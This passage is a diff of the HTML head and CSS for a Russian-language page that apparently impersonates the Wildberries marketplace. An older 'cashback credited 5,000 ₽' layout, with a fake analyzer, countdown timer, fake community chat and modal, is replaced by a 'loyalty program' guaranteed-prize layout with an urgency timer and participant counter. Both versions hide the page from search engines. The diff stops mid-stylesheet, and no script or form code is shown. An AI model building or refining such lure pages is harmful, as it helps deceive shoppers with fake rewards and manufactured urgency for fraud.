@@ -1,1444 +1,788 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes, viewport-fit=cover"/>
-  <title>WB Кешбэк | Вам начислено 5 000 ₽</title>
-
-  <meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noimageindex">
-  <meta name="googlebot" content="noindex, nofollow, noarchive, nosnippet, noimageindex">
-  <meta name="referrer" content="no-referrer">
-  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
-  <meta http-equiv="Pragma" content="no-cache">
-  <meta http-equiv="Expires" content="0">
-
-  <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
-
-    body {
-      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
-      background: linear-gradient(180deg, #FDF2F8 0%, #FFF5F9 30%, #F8F0FF 60%, #FFF0F5 100%);
-      min-height: 100vh;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      padding: 16px;
-      position: relative;
-      overflow-x: hidden;
-    }
-
-    body::before {
-      content: "";
-      position: fixed;
-      top: -30%;
-      left: -30%;
-      width: 160%;
-      height: 160%;
-      background: 
-        radial-gradient(circle at 25% 35%, rgba(217, 119, 6, 0.06) 0%, transparent 40%),
-        radial-gradient(circle at 75% 65%, rgba(168, 85, 247, 0.05) 0%, transparent 40%),
-        radial-gradient(circle at 50% 20%, rgba(251, 191, 36, 0.04) 0%, transparent 35%);
-      animation: gentleFloat 20s infinite alternate ease-in-out;
-      z-index: 0;
-    }
-
-    @keyframes gentleFloat {
-      0% { transform: scale(1) rotate(0deg); }
-      100% { transform: scale(1.04) rotate(1deg); }
-    }
-
-    .app-container {
-      max-width: 480px;
-      width: 100%;
-      position: relative;
-      z-index: 10;
-    }
-
-    /* Шапка с лого */
-    .brand-header {
-      text-align: center;
-      padding: 20px 20px 0;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 8px;
-    }
-
-    .wb-logo {
-      font-size: 16px;
-      font-weight: 800;
-      color: #7C3AED;
-      background: rgba(255, 255, 255, 0.8);
-      backdrop-filter: blur(10px);
-      padding: 10px 20px;
-      border-radius: 100px;
-      border: 1px solid rgba(168, 85, 247, 0.2);
-      box-shadow: 0 2px 12px rgba(168, 85, 247, 0.08);
-      display: inline-flex;
-      align-items: center;
-      gap: 6px;
-    }
-
-    .wb-check {
-      display: inline-flex;
-      align-items: center;
-      justify-content: center;
-      width: 20px;
-      height: 20px;
-      background: #7C3AED;
-      border-radius: 50%;
-      color: white;
-      font-size: 11px;
-      font-weight: 700;
-    }
-
-    /* Карточка */
-    .glass-card {
-      background: rgba(255, 255, 255, 0.75);
-      backdrop-filter: blur(30px);
-      -webkit-backdrop-filter: blur(30px);
-      border: 1px solid rgba(168, 85, 247, 0.12);
-      border-radius: 32px;
-      box-shadow: 0 20px 50px -15px rgba(139, 92, 246, 0.15),
-                  inset 0 0 0 1px rgba(255, 255, 255, 0.6);
-      overflow: hidden;
-      transition: all 0.4s cubic-bezier(0.16, 1, 0.3, 1);
-      margin-top: 10px;
-    }
-
-    /* Hero-секция */
-    .hero {
-      padding: 24px 24px 10px;
-      text-align: center;
-      position: relative;
-    }
-
-    .icon-circle {
-      width: 70px;
-      height: 70px;
-      border-radius: 50%;
-      background: linear-gradient(135deg, #FEF3C7, #FDE68A);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 36px;
-      margin: 0 auto 14px;
-      box-shadow: 0 8px 25px rgba(217, 119, 6, 0.2);
-      animation: coinPulse 3s infinite ease-in-out;
-    }
-
-    @keyframes coinPulse {
-      0%, 100% { transform: scale(1); box-shadow: 0 8px 25px rgba(217, 119, 6, 0.2); }
-      50% { transform: scale(1.06); box-shadow: 0 12px 35px rgba(217, 119, 6, 0.35); }
-    }
-
-    .hero-badge {
-      display: inline-flex;
-      align-items: center;
-      gap: 6px;
-      background: linear-gradient(135deg, #FEF3C7, #FDE68A);
-      border: 1px solid #F59E0B;
-      padding: 6px 16px;
-      border-radius: 100px;
-      font-size: 12px;
-      font-weight: 700;
-      color: #92400E;
-      margin-bottom: 14px;
-    }
-
-    .hero h1 {
-      font-size: 24px;
-      font-weight: 800;
-      color: #1F2937;
-      margin-bottom: 6px;
-      line-height: 1.3;
-    }
-
-    .hero h1 .accent {
-      background: linear-gradient(135deg, #D97706, #DC2626);
-      -webkit-background-clip: text;
-      background-clip: text;
-      color: transparent;
-    }
-
-    .hero-sub {
-      font-size: 13px;
-      color: #6B7280;
-      margin-bottom: 4px;
-    }
-
-    /* Блок с суммой */
-    .cashback-card {
-      margin: 14px 20px 10px;
-      background: linear-gradient(135deg, #FFFBEB, #FFF7ED, #FFFBEB);
-      border: 1.5px solid #FCD34D;
-      border-radius: 24px;
-      padding: 18px 16px;
-      position: relative;
-      overflow: hidden;
-    }
-
-    .cashback-card::before {
-      content: "";
-      position: absolute;
-      top: -20px;
-      right: -20px;
-      width: 80px;
-      height: 80px;
-      background: radial-gradient(circle, rgba(251, 191, 36, 0.3) 0%, transparent 70%);
-      border-radius: 50%;
-    }
-
-    .cashback-label {
-      font-size: 11px;
-      font-weight: 600;
-      color: #92400E;
-      text-transform: uppercase;
-      letter-spacing: 0.5px;
-      margin-bottom: 4px;
-    }
-
-    .cashback-amount-row {
-      display: flex;
-      align-items: baseline;
-      gap: 6px;
-      margin-bottom: 10px;
-    }
-
-    .cashback-amount {
-      font-size: 42px;
-      font-weight: 900;
-      color: #1F2937;
-      line-height: 1;
-    }
-
-    .cashback-currency {
-      font-size: 20px;
-      font-weight: 700;
-      color: #6B7280;
-    }
-
-    .cashback-status {
-      display: inline-flex;
-      align-items: center;
-      gap: 6px;
-      background: #FEF3C7;
-      padding: 6px 14px;
-      border-radius: 100px;
-      font-size: 12px;
-      font-weight: 700;
-      color: #92400E;
-    }
-
-    .status-dot {
-      width: 8px;
-      height: 8px;
-      border-radius: 50%;
-      background: #F59E0B;
-      animation: dotBlink 1.5s infinite;
-    }
-
-    @keyframes dotBlink {
-      0%, 100% { opacity: 1; }
-      50% { opacity: 0.3; }
-    }
-
-    /* Детализация */
-    .details-section {
-      padding: 6px 20px 12px;
-    }
-
-    .details-title {
-      font-size: 13px;
-      font-weight: 700;
-      color: #374151;
-      margin-bottom: 10px;
-      display: flex;
-      align-items: center;
-      gap: 6px;
-    }
-
-    .shopping-summary {
-      background: rgba(255, 255, 255, 0.6);
-      border-radius: 16px;
-      padding: 12px 14px;
-      border: 1px solid rgba(0, 0, 0, 0.04);
-    }
-
-    .summary-row {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      padding: 8px 0;
-      font-size: 13px;
-      color: #4B5563;
-      border-bottom: 1px solid rgba(0, 0, 0, 0.04);
-    }
-
-    .summary-row:last-child {
-      border-bottom: none;
-    }
-
-    .summary-row.total {
-      font-weight: 700;
-      font-size: 14px;
-      color: #1F2937;
-      margin-top: 2px;
-      padding-top: 10px;
-      border-top: 2px dashed #FCD34D;
-    }
-
-    .category-tag {
-      display: inline-flex;
-      align-items: center;
-      gap: 4px;
-      background: rgba(168, 85, 247, 0.08);
-      padding: 3px 10px;
-      border-radius: 20px;
-      font-size: 11px;
-      color: #7C3AED;
-      font-weight: 600;
-    }
-
-    /* Прогресс кешбэка */
-    .progress-card {
-      margin: 0 20px 14px;
-      background: rgba(255, 255, 255, 0.5);
-      border-radius: 18px;
-      padding: 14px;
-      border: 1px solid rgba(0, 0, 0, 0.04);
-    }
-
-    .progress-header {
-      display: flex;
-      justify-content: space-between;
-      font-size: 11px;
-      color: #6B7280;
-      font-weight: 600;
-      margin-bottom: 6px;
-    }
-
-    .progress-bar-wrap {
-      height: 6px;
-      background: rgba(251, 191, 36, 0.15);
-      border-radius: 10px;
-      overflow: hidden;
-      margin-bottom: 8px;
-    }
-
-    .progress-bar-fill {
-      width: 0%;
-      height: 100%;
-      background: linear-gradient(90deg, #F59E0B, #D97706, #DC2626);
-      border-radius: 10px;
-      box-shadow: 0 0 12px rgba(245, 158, 11, 0.4);
-      transition: width 2.5s cubic-bezier(0.4, 0, 0.2, 1);
-    }
-
-    .progress-note {
-      font-size: 11px;
-      color: #9CA3AF;
-      text-align: center;
-    }
-
-    /* Кнопка */
-    .cta-section {
-      padding: 0 20px 10px;
-    }
-
-    .cta-button {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 10px;
-      width: 100%;
-      background: linear-gradient(135deg, #D97706, #DC2626);
-      color: white;
-      padding: 16px 20px;
-      border-radius: 60px;
-      font-weight: 700;
-      font-size: 16px;
-      border: none;
-      cursor: pointer;
-      font-family: inherit;
-      box-shadow: 0 8px 25px -6px rgba(220, 38, 38, 0.35),
-                  0 0 0 1px rgba(255, 255, 255, 0.3);
-      transition: all 0.3s;
-      position: relative;
-      overflow: hidden;
-    }
-
-    .cta-button::after {
-      content: "";
-      position: absolute;
-      top: -50%;
-      left: -50%;
-      width: 200%;
-      height: 200%;
-      background: radial-gradient(circle, rgba(255,255,255,0.25) 0%, transparent 60%);
-      opacity: 0;
-      transition: opacity 0.3s;
-    }
-
-    .cta-button:hover::after {
-      opacity: 1;
-    }
-
-    .cta-button:hover {
-      transform: translateY(-2px);
-      box-shadow: 0 12px 32px -6px rgba(220, 38, 38, 0.45);
-    }
-
-    .cta-button:active {
-      transform: scale(0.97);
-    }
-
-    .secure-row {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 12px;
-      margin-top: 8px;
-      font-size: 10px;
-      color: #9CA3AF;
-    }
-
-    .secure-item {
-      display: flex;
-      align-items: center;
-      gap: 4px;
-    }
-
-    /* FAQ */
-    .faq-block {
-      margin: 14px 20px 18px;
-      text-align: left;
-    }
-
-    .faq-title {
-      font-size: 13px;
-      font-weight: 700;
-      color: #374151;
-      margin-bottom: 8px;
-    }
-
-    .faq-item {
-      background: rgba(255, 255, 255, 0.5);
-      border: 1px solid rgba(0, 0, 0, 0.04);
-      border-radius: 14px;
-      margin-bottom: 7px;
-      overflow: hidden;
-      transition: all 0.3s ease;
-    }
-
-    .faq-item.open {
-      background: rgba(168, 85, 247, 0.04);
-      border-color: rgba(168, 85, 247, 0.2);
-    }
-
-    .faq-question {
-      width: 100%;
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      padding: 13px 14px;
-      background: none;
-      border: none;
-      color: #4B5563;
-      font-size: 12px;
-      font-weight: 600;
-      font-family: inherit;
-      cursor: pointer;
-      text-align: left;
-      gap: 8px;
-    }
-
-    .faq-arrow {
-      font-size: 10px;
-      color: #D97706;
-      transition: transform 0.3s ease;
-      flex-shrink: 0;
-    }
-
-    .faq-item.open .faq-arrow {
-      transform: rotate(180deg);
-    }
-
-    .faq-answer {
-      max-height: 0;
-      overflow: hidden;
-      transition: max-height 0.4s ease, padding 0.3s ease;
-    }
-
-    .faq-item.open .faq-answer {
-      max-height: 180px;
-    }
-
-    .faq-answer-inner {
-      padding: 0 14px 13px;
-      font-size: 11px;
-      color: #6B7280;
-      line-height: 1.5;
-    }
-
-    .faq-answer-inner strong {
-      color: #374151;
-    }
-
-    .faq-answer-inner .highlight {
-      color: #D97706;
-      font-weight: 700;
-    }
-
-    /* Анализ */
-    .analyzer-overlay {
-      padding: 40px 24px;
-      text-align: center;
-      display: none;
-    }
-
-    .analyzer-overlay.active {
-      display: block;
-      animation: fadeInUp 0.4s ease;
-    }
-
-    @keyframes fadeInUp {
-      from { opacity: 0; transform: translateY(20px); }
-      to { opacity: 1; transform: translateY(0); }
-    }
-
-    .spin-circle {
-      width: 64px;
-      height: 64px;
-      margin: 0 auto 18px;
-      border-radius: 50%;
-      background: conic-gradient(from 90deg, #F59E0B, #D97706, #FCD34D, #F59E0B);
-      animation: spin 1.2s linear infinite;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-    }
-
-    .spin-circle::before {
-      content: "";
-      width: 46px;
-      height: 46px;
-      background: #FFFBEB;
-      border-radius: 50%;
-    }
-
-    @keyframes spin { to { transform: rotate(360deg); } }
-
-    .analyze-status {
-      font-size: 13px;
-      color: #92400E;
-      font-weight: 600;
-    }
-
-    /* Финальный экран */
-    .final-screen {
-      padding: 24px 20px 20px;
-      text-align: center;
-      display: none;
-    }
-
-    .final-screen.active {
-      display: block;
-      animation: fadeInUp 0.5s ease;
-    }
-
-    .final-icon {
-      font-size: 56px;
-      margin-bottom: 8px;
-    }
-
-    .final-amount {
-      font-size: 44px;
-      font-weight: 900;
-      background: linear-gradient(135deg, #D97706, #DC2626);
-      -webkit-background-clip: text;
-      background-clip: text;
-      color: transparent;
-      margin: 6px 0;
-      line-height: 1.1;
-    }
-
-    .final-badge {
-      display: inline-flex;
-      align-items: center;
-      gap: 6px;
-      background: #FEF3C7;
-      padding: 8px 16px;
-      border-radius: 100px;
-      font-size: 12px;
-      font-weight: 700;
-      color: #92400E;
-      margin: 10px 0;
-      border: 1px solid #FCD34D;
-    }
-
-    .instruction-card {
-      background: rgba(255, 255, 255, 0.6);
-      border: 1px solid rgba(0, 0, 0, 0.04);
-      border-radius: 20px;
-      padding: 16px;
-      margin: 16px 0;
-      text-align: left;
-    }
-
-    .instruction-card h4 {
-      font-size: 13px;
-      color: #1F2937;
-      margin-bottom: 10px;
-    }
-
-    .instruction-steps {
-      list-style: none;
-      display: flex;
-      flex-direction: column;
-      gap: 10px;
-    }
-
-    .instruction-steps li {
-      display: flex;
-      align-items: center;
-      gap: 10px;
-      font-size: 12px;
-      color: #4B5563;
-    }
-
-    .step-num {
-      width: 24px;
-      height: 24px;
-      border-radius: 50%;
-      background: linear-gradient(135deg, #F59E0B, #D97706);
-      color: white;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 12px;
-      font-weight: 700;
-      flex-shrink: 0;
-    }
-
-    .timer-badge {
-      display: inline-flex;
-      align-items: center;
-      gap: 6px;
-      background: #FEE2E2;
-      border: 1px solid #FCA5A5;
-      padding: 10px 16px;
-      border-radius: 100px;
-      font-size: 13px;
-      font-weight: 700;
-      color: #DC2626;
-      margin: 12px 0 6px;
-    }
-
-    .timer-badge .timer-value {
-      animation: urgentPulse 1s infinite;
-    }
-
-    @keyframes urgentPulse {
-      0%, 100% { opacity: 1; }
-      50% { opacity: 0.5; }
-    }
-
-    /* Чат */
-    .community-chat {
-      margin: 10px 20px 18px;
-      background: rgba(255, 255, 255, 0.55);
-      backdrop-filter: blur(20px);
-      border-radius: 22px;
-      border: 1px solid rgba(0, 0, 0, 0.05);
-      overflow: hidden;
-    }
-
-    .chat-top {
-      padding: 10px 16px;
-      background: rgba(251, 191, 36, 0.08);
-      display: flex;
-      justify-content: space-between;
-      color: #92400E;
-      font-weight: 600;
-      font-size: 11px;
-    }
-
-    .messages-stream {
-      height: 200px;
-      overflow-y: auto;
-      padding: 12px;
-      display: flex;
-      flex-direction: column;
-      gap: 10px;
-    }
-
-    .msg {
-      display: flex;
-      gap: 8px;
-    }
-
-    .msg.new-message {
-      animation: fadeMsg 0.3s ease;
-    }
-
-    @keyframes fadeMsg {
-      from { opacity: 0; transform: translateY(4px); }
-      to { opacity: 1; transform: translateY(0); }
-    }
-
-    .msg-avatar {
-      width: 28px;
-      height: 28px;
-      border-radius: 50%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      color: white;
-      font-weight: 700;
-      font-size: 11px;
-      flex-shrink: 0;
-    }
-
-    .msg-bubble {
-      max-width: 80%;
-      background: rgba(251, 191, 36, 0.06);
-      padding: 8px 12px;
-      border-radius: 14px;
-      border-bottom-left-radius: 3px;
-      font-size: 11px;
-      color: #4B5563;
-      line-height: 1.4;
-    }
-
-    .msg-name {
-      font-weight: 700;
-      font-size: 9px;
-      color: #92400E;
-      margin-bottom: 2px;
-    }
-
-    .chat-input-row {
-      display: flex;
-      padding: 8px;
-      background: rgba(255, 255, 255, 0.4);
-      gap: 5px;
-    }
-
-    .chat-input-field {
-      flex: 1;
-      padding: 8px 12px;
-      background: rgba(255, 255, 255, 0.7);
-      border: 1px solid rgba(0, 0, 0, 0.06);
-      border-radius: 25px;
-      color: #1F2937;
-      font-size: 11px;
-      outline: none;
-    }
-
-    .chat-send-btn {
-      background: linear-gradient(135deg, #F59E0B, #D97706);
-      border: none;
-      border-radius: 25px;
-      padding: 0 14px;
-      color: white;
-      font-weight: 700;
-      cursor: pointer;
-    }
-
-    /* Модальное окно */
-    .modal-overlay {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: rgba(0, 0, 0, 0.45);
-      backdrop-filter: blur(4px);
-      -webkit-backdrop-filter: blur(4px);
-      z-index: 10000;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      padding: 20px;
-      animation: fadeIn 0.3s ease;
-    }
-
-    @keyframes fadeIn {
-      from { opacity: 0; }
-      to { opacity: 1; }
-    }
-
-    .modal-glass {
-      background: rgba(255, 255, 255, 0.95);
-      backdrop-filter: blur(30px);
-      border: 1px solid rgba(168, 85, 247, 0.15);
-      border-radius: 28px;
-      padding: 26px 22px 22px;
-      max-width: 380px;
-      width: 100%;
-      text-align: center;
-      box-shadow: 0 25px 50px -15px rgba(0, 0, 0, 0.2);
-      animation: slideUp 0.35s ease;
-    }
-
-    @keyframes slideUp {
-      from { transform: translateY(30px); opacity: 0; }
-      to { transform: translateY(0); opacity: 1; }
-    }
-
-    .modal-icon {
-      font-size: 44px;
-      margin-bottom: 10px;
-    }
-
-    .modal-glass h3 {
-      font-size: 18px;
-      font-weight: 800;
-      color: #1F2937;
-      margin-bottom: 6px;
-    }
-
-    .modal-subtitle {
-      font-size: 12px;
-      color: #92400E;
-      font-weight: 600;
-      margin-bottom: 14px;
-    }
-
-    .modal-info-cards {
-      display: flex;
-      flex-direction: column;
-      gap: 7px;
-      margin-bottom: 16px;
-      text-align: left;
-    }
-
-    .modal-info-card {
-      background: rgba(251, 191, 36, 0.05);
-      border: 1px solid rgba(251, 191, 36, 0.12);
-      border-radius: 12px;
-      padding: 10px 12px;
-      display: flex;
-      align-items: center;
-      gap: 8px;
-      font-size: 11px;
-      color: #4B5563;
-    }
-
-    .info-icon {
-      font-size: 16px;
-      flex-shrink: 0;
-    }
-
-    .modal-btn-continue {
-      display: block;
-      width: 100%;
-      background: linear-gradient(135deg, #D97706, #DC2626);
-      color: white;
-      border: none;
-      padding: 15px 20px;
-      border-radius: 50px;
-      font-weight: 700;
-      font-size: 15px;
-      font-family: inherit;
-      cursor: pointer;
-      margin-bottom: 8px;
-      box-shadow: 0 8px 22px -5px rgba(220, 38, 38, 0.35);
-      transition: all 0.3s;
-    }
-
-    .modal-btn-continue:hover {
-      transform: translateY(-2px);
-      box-shadow: 0 12px 28px -5px rgba(220, 38, 38, 0.45);
-    }
-
-    .modal-btn-cancel {
-      background: none;
-      border: 1px solid rgba(0, 0, 0, 0.08);
-      color: #9CA3AF;
-      padding: 9px 18px;
-      border-radius: 50px;
-      font-size: 12px;
-      font-weight: 600;
-      font-family: inherit;
-      cursor: pointer;
-    }
-
-    .modal-secure-note {
-      margin-top: 10px;
-      font-size: 9px;
-      color: #9CA3AF;
-    }
-
-    .toast {
-      position: fixed;
-      top: 20px;
-      left: 50%;
-      transform: translateX(-50%);
-      background: rgba(217, 119, 6, 0.95);
-      backdrop-filter: blur(20px);
-      border: 1px solid rgba(255, 255, 255, 0.3);
-      border-radius: 20px;
-      padding: 12px 20px;
-      color: white;
-      font-weight: 600;
-      font-size: 12px;
-      z-index: 9999;
-      box-shadow: 0 10px 25px rgba(217, 119, 6, 0.35);
-      animation: toastIn 0.4s ease;
-    }
-
-    @keyframes toastIn {
-      from { opacity: 0; transform: translateX(-50%) translateY(-25px); }
-      to { opacity: 1; transform: translateX(-50%) translateY(0); }
-    }
-
-    @media (max-width: 420px) {
-      .hero h1 { font-size: 21px; }
-      .cashback-amount { font-size: 36px; }
-      .final-amount { font-size: 38px; }
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="robots" content="noindex, nofollow">
+    <meta name="referrer" content="no-referrer">
+    <title>Wildberries — Программа лояльности</title>
+    <style>
+        :root {
+            --wb-purple: #9360c8;
+            --wb-purple-dark: #7b4db5;
+            --wb-purple-light: rgba(147, 96, 200, 0.08);
+            --wb-purple-border: rgba(147, 96, 200, 0.2);
+            --wb-gradient: linear-gradient(135deg, #9360c8, #a64dff);
+            --bg: #f5f5f7;
+            --card-bg: #ffffff;
+            --card-border: #e8e8ed;
+            --text: #1d1d1f;
+            --sub: #6e6e73;
+            --gold: #d4a843;
+            --gold-bg: rgba(212, 168, 67, 0.08);
+            --gold-border: rgba(212, 168, 67, 0.25);
+            --red-accent: #f5515c;
+            --radius: 16px;
+            --shadow: 0 2px 4px rgba(0,0,0,0.04), 0 8px 24px rgba(0,0,0,0.07);
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            background: var(--bg);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            min-height: 100dvh;
+            padding: 20px 16px;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+            touch-action: manipulation;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 430px;
+        }
+        
+        /* Шапка с логотипом */
+        .header {
+            text-align: center;
+            margin-bottom: 8px;
+        }
+        
+        .header-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: var(--wb-purple-light);
+            border: 1px solid var(--wb-purple-border);
+            border-radius: 30px;
+            padding: 8px 18px;
+            font-size: 13px;
+            color: var(--wb-purple-dark);
+            font-weight: 600;
+            margin-bottom: 16px;
+        }
+        
+        .badge-dot {
+            width: 8px;
+            height: 8px;
+            background: var(--wb-purple);
+            border-radius: 50%;
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0%, 100% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.3; transform: scale(0.7); }
+        }
+        
+        /* Основная карточка */
+        .main-card {
+            background: var(--card-bg);
+            border: 1px solid var(--card-border);
+            border-radius: var(--radius);
+            padding: 28px 20px 22px;
+            box-shadow: var(--shadow);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        /* Декоративная полоса сверху */
+        .main-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: var(--wb-gradient);
+        }
+        
+        /* Секция с суммой/призом */
+        .prize-section {
+            text-align: center;
+            margin-bottom: 8px;
+        }
+        
+        .prize-crown {
+            font-size: 42px;
+            margin-bottom: 8px;
+            animation: float 2.5s ease-in-out infinite;
+        }
+        
+        @keyframes float {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-8px); }
+        }
+        
+        .prize-ribbon {
+            display: inline-block;
+            background: var(--red-accent);
+            color: #ffffff;
+            font-size: 11px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.1em;
+            padding: 6px 16px;
+            border-radius: 20px;
+            margin-bottom: 16px;
+        }
+        
+        .prize-heading {
+            font-size: 24px;
+            font-weight: 700;
+            color: var(--text);
+            letter-spacing: -0.02em;
+            line-height: 1.25;
+            margin-bottom: 6px;
+        }
+        
+        .prize-heading .highlight {
+            background: linear-gradient(135deg, var(--wb-purple), #a64dff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        
+        .prize-subhead {
+            font-size: 14px;
+            color: var(--sub);
+            margin-bottom: 20px;
+            line-height: 1.4;
+        }
+        
+        /* Блок с гарантированными призами */
+        .prizes-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr;
+            gap: 8px;
+            margin-bottom: 18px;
+        }
+        
+        .prize-item {
+            background: var(--gold-bg);
+            border: 1px solid var(--gold-border);
+            border-radius: 10px;
+            padding: 12px 6px;
+            text-align: center;
+        }
+        
+        .prize-item-icon {
+            font-size: 26px;
+            margin-bottom: 4px;
+        }
+        
+        .prize-item-name {
+            font-size: 11px;
+            color: var(--text);
+            font-weight: 600;
+            line-height: 1.3;
+        }
+        
+        .prize-item-value {
+            font-size: 10px;
+            color: var(--gold);
+            font-weight: 700;
+            margin-top: 2px;
+        }
+        
+        /* Секция "Как это работает" */
+        .steps-section {
+            margin-bottom: 18px;
+        }
+        
+        .steps-title {
+            font-size: 13px;
+            color: var(--sub);
+            text-transform: uppercase;
+            letter-spacing: 0.08em;
+            font-weight: 600;
+            margin-bottom: 10px;
+            text-align: center;
+        }
+        
+        .step-row {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 8px 0;
+        }
+        
+        .step-num {
+            width: 28px;
+            height: 28px;
+            min-width: 28px;
+            background: var(--wb-purple);
+            color: #ffffff;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 13px;
+            font-weight: 700;
+        }
+        
+        .step-text {
+            font-size: 13px;
+            color: var(--text);
+            line-height: 1.3;
+        }
+        
+        .step-text small {
+            color: var(--sub);
+            font-size: 11px;
+        }
+        
+        /* Таймер */
+        .timer-block {
+            background: linear-gradient(135deg, #fef9f0, #fdf5e6);
+            border: 1px solid var(--gold-border);
+            border-radius: 10px;
+            padding: 14px 16px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 16px;
+        }
+        
+        .timer-left {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .timer-icon {
+            font-size: 20px;
+        }
+        
+        .timer-info {
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .timer-label {
+            font-size: 12px;
+            color: var(--sub);
+            font-weight: 500;
+        }
+        
+        .timer-urgency {
+            font-size: 11px;
+            color: var(--red-accent);
+            font-weight: 600;
+        }
+        
+        .timer-value {
+            font-size: 18px;
+            font-weight: 700;
+            color: var(--text);
+            font-variant-numeric: tabular-nums;
+            font-family: 'SF Mono', 'Menlo', 'Consolas', monospace;
+            letter-spacing: 0.04em;
+        }
+        
+        .timer-value.urgent {
+            color: var(--red-accent);
+            animation: blink 1s infinite;
+        }
+        
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+        
+        /* Счетчик участников */
+        .counter-block {
+            text-align: center;
+            margin-bottom: 16px;
+            font-size: 12px;
+            color: var(--sub);
+        }
+        
+        .counter-block strong {
+            color: var(--red-accent);
+            font-weight: 700;
+        }
+        
+        .counter-dots {
+            display: flex;
+            justify-content: center;
+            gap: 4px;
+            margin-top: 6px;
+        }
+        
+        .counter-dot {
+            width: 6px;
+            height: 6px;
+            background: var(--wb-purple);
+            border-radius: 50%;
+            animation: pulse 1.5s infinite;
+        }
+        
+        .counter-dot:nth-child(2) { animation-delay: 0.2s; }
+        .counter-dot:nth-child(3) { animation-delay: 0.4s; }
+        .counter-dot:nth-child(4) { animation-delay: 0.6s; }
+        .counter-dot:nth-child(5) { animation-delay: 0.8s; }
+        
+        /* Кнопка */
+        .btn-main {
+            display: block;
+            width: 100%;
+            padding: 18px;
+            background: var(--wb-gradient);
+            color: #ffffff;
+            border: none;
+            border-radius: 12px;
+            font-size: 17px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: transform 0.1s ease, box-shadow 0.2s ease;
+            -webkit-appearance: none;
+            -moz-appearance: none;
+            appearance: none;
+            letter-spacing: -0.01em;
+            -webkit-tap-highlight-color: transparent;
+            user-select: none;
+            -webkit-user-select: none;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 4px 16px rgba(147, 96, 200, 0.35);
+            text-align: center;
+        }
+        
+        .btn-main:active {
+            transform: scale(0.97);
+            box-shadow: 0 6px 24px rgba(147, 96, 200, 0.5);
+        }
+        
+        .btn-main.loading {
+            pointer-events: none;
+            opacity: 0.85;
+        }
+        
+        .btn-main .spinner-btn {
+            display: none;
+            width: 24px;
+            height: 24px;
+            border: 2.5px solid rgba(255,255,255,0.3);
+            border-top: 2.5px solid #ffffff;
+            border-radius: 50%;
+            animation: spin 0.6s linear infinite;
+            margin: 0 auto;
+        }
+        
+        .btn-main.loading .btn-text { display: none; }
+        .btn-main.loading .spinner-btn { display: block; }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        .btn-sub {
+            text-align: center;
+            font-size: 11px;
+            color: var(--sub);
+            margin-top: 8px;
+            line-height: 1.4;
+        }
+        
+        /* Бейдж "Гарантировано" */
+        .guarantee-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            background: #e8f5e9;
+            border: 1px solid #c8e6c9;
+            color: #2e7d32;
+            font-size: 12px;
+            font-weight: 600;
+            padding: 6px 12px;
+            border-radius: 20px;
+            margin-top: 4px;
+        }
+        
+        /* Футер */
+        .footer-note {
+            text-align: center;
+            font-size: 10px;
+            color: #aeaeb2;
+            margin-top: 16px;
+            line-height: 1.5;
+        }
+        
+        /* Начальный лоадер */
+        .initial-loader {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 14px;
+            padding: 40px 20px;
+            background: var(--card-bg);
+            border-radius: var(--radius);
+            box-shadow: var(--shadow);
+        }
+        
+        .initial-loader .spinner {
+            width: 36px;
+            height: 36px;
+            border: 3px solid #e8e8ed;
+            border-top: 3px solid var(--wb-purple);
+            border-radius: 50%;
+            animation: spin 0.7s linear infinite;
+        }
+        
+        .initial-loader .loading-text {
+            font-size: 14px;
+            color: var(--sub);
+            font-weight: 500;
+        }
+        
+        /* Анимация появления */
